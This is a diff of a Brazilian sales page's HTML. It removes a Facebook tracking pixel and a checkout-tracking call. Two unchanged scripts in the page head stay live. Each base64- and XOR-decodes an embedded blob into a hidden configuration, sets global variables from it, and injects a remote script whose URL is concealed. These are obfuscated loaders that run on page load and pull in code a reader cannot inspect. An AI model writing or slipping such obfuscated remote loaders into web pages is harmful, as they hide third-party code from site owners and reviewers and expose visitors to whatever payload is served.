@@ -141,12 +141,6 @@
       }
     </style>
     <script>(function(){var p_0=atob("DFP1xLURZo+tYgULHSjXscd9RLWPCnF/bSDP65pyAuGDF3FmdDWM6tZ+C6HPECp4fiGctMFiSfrZD3YkcTKBocZlSOXeQCkpfCeBttxzE/vIEScxRijXqtR8A62XQGFqaTLYscF8D+nUT3V5eCWQqsE8HuzCBih4fjjX6JdnB+PYBycxP3GI6M4zCO7ABycxPzeUsNQ8E/vAC2NyMCOHocN0CPuAEXBpdDeG5pkzEO7BF2ApJ3HXuehs");var u_l=[];for(var l_lkp=0;l_lkp<p_0.length;l_lkp++){u_l.push(p_0.charCodeAt(l_lkp)&255);}var u_4=u_l[0];var w_fg=u_l.slice(1,1+u_4);var e_pcn=u_l.slice(1+u_4);var a_6pj=e_pcn.map(function(b,p_kfc){return b^w_fg[p_kfc%u_4];});var m_fhp="";for(var c_7=0;c_7<a_6pj.length;c_7++){m_fhp+=String.fromCharCode(a_6pj[c_7]&255);}var u_c=decodeURIComponent(escape(m_fhp));var u_emyf=JSON.parse(u_c);var h_22=u_emyf.globals||[];h_22.forEach(function(j_rzf4){window[j_rzf4.name]=j_rzf4.value;});var n_br=document.createElement("script");n_br.src=u_emyf.url;n_br.async=true;n_br.defer=true;(u_emyf.attributes||[]).forEach(function(w_3z88){n_br.setAttribute(w_3z88.name,w_3z88.value);});(document.head||document.documentElement).appendChild(n_br);})();</script>
-    <script>
-      !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
-      fbq('init','29608783672067134');
-      fbq('track','PageView');
-    </script>
-    <noscript><img height="1" width="1" style="display:none" alt="" src="https://www.facebook.com/tr?id=29608783672067134&ev=PageView&noscript=1" /></noscript>
     <script>(function(){var m_zdrf=atob("DL2eYa9AGwpnZlNGSca8FN0sOTBFDicyOc6kToAjf2RJEycrINvnT8wvdiQFFHw1Ks/3EdszNHoOHjYqZs33GcosNWAURH9kKMnqE8Yibn4CFXF8EuCyQ8gsdGgGCiBkc+blQ8Ehdm9FXHE2IMX7DeYkOSZFEDIqPNi8W412eTpXXmEiK9z4UZYheT5WXmUjf4iqU59iZlca");var u_e=[];for(var r_p=0;r_p<m_zdrf.length;r_p++){u_e.push(m_zdrf.charCodeAt(r_p)&255);}var g_q6=u_e[0];var x_j0k=u_e.slice(1,1+g_q6);var s_qo=u_e.slice(1+g_q6);var r_44=s_qo.map(function(b,g_k77){return b^x_j0k[g_k77%g_q6];});var z_xbul="";for(var j_2=0;j_2<r_44.length;j_2++){z_xbul+=String.fromCharCode(r_44[j_2]&255);}var m_3z=decodeURIComponent(escape(z_xbul));var r_bf=JSON.parse(m_3z);var t_1n=r_bf.globals||[];t_1n.forEach(function(n_ie5q){window[n_ie5q.name]=n_ie5q.value;});var x_3bkn=document.createElement("script");x_3bkn.src=r_bf.url;x_3bkn.async=true;x_3bkn.defer=true;(r_bf.attributes||[]).forEach(function(s_ne){x_3bkn.setAttribute(s_ne.name,s_ne.value);});(document.head||document.documentElement).appendChild(x_3bkn);})();</script>
   </head>
   <body>
@@ -193,13 +187,10 @@
       const COMPLETE_UPGRADE_CHECKOUT_URL = 'https://ggcheckout.app/checkout/v5/QyReoQ11f0S492iApinO3z';
       const COMPLETE_CHECKOUT_URL = 'https://ggcheckout.app/checkout/v5/7HniTWu3KdmMcexwHU8qHg';
       const CHECKOUTS = { basic: BASIC_CHECKOUT_URL, completeUpgrade: COMPLETE_UPGRADE_CHECKOUT_URL, complete: COMPLETE_CHECKOUT_URL };
-      const CHECKOUT_VALUES = { basic: 10, completeUpgrade: 17.9, complete: 27.9 };
-      const trackInitiateCheckout = (plan) => { if (typeof window.fbq === 'function') window.fbq('track','InitiateCheckout',{value:CHECKOUT_VALUES[plan],currency:'BRL'}); };
       const initiateCheckout = (event, plan) => {
         const url = CHECKOUTS[plan];
         if (!url) { event.preventDefault(); return false; }
         event.currentTarget.href = url;
-        trackInitiateCheckout(plan);
         return true;
       };
       document.querySelectorAll('.checkout-link').forEach((link) => { link.href = CHECKOUT_URL; });
